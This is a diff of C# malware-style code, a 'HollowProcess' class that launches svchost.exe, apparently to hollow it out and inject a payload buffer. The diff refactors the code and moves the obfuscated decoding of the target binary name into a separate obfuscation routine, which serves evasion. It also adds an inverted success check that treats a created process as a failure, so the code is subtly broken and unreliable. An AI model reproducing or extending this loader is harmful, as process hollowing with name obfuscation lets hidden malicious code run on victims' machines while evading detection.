@@ -15,9 +15,9 @@ internal static class HollowProcess
     internal static Task Run(byte[] buf)
     {
         var si = new StartupInfo();
-        var result = Lib.CreateProcessW(
+        Lib.CreateProcessW(
             null,
-            GetBinary(),
+            Obfuscation.GetObfuscatedBinaryName(),
             IntPtr.Zero,
             IntPtr.Zero,
             false,
@@ -27,11 +27,15 @@ internal static class HollowProcess
             ref si,
             out ProcessInformation pi
         );
-        
-        if (result && RuntimeConfig.IsDebugEnabled)
+        return Run(buf, pi);
+    }
+
+    internal static Task Run(byte[] buf, ProcessInformation pi)
+    {
+        if (pi.dwProcessId != 0 && RuntimeConfig.IsDebugEnabled)
             Console.WriteLine($"CreateProcess was successful - SvcHost PID: {pi.dwProcessId}");
 
-        if (!result)
+        if (!pi.dwProcessId.Equals(0))
         {
             var error = Lib.GetLastWin32Error();
             Console.WriteLine($"CreateProcess failed - error: {error}");
@@ -71,14 +75,6 @@ internal static class HollowProcess
         return;
     }
 
-    private static string GetBinary()
-    {
-        var names = new string[] { "c:", "wIndOWs", "SYsTem32" };
-        var n = new int[] { 115, 118, 99, 104, 111, 115, 116, 46, 101, 120, 101 };
-        var nm = Enumerable.Range(0, n.Length).Select(x => (char)(n[x] + 1)).ToArray();
-        nm = Enumerable.Range(0, nm.Length).Select(x => (char)(nm[x] - 1)).ToArray();
-        return Path.Combine(names[0], names[1], names[2], new string(nm));
-    }
 
     private static IntPtr GetEntryPoint(IntPtr hProcess)
     {
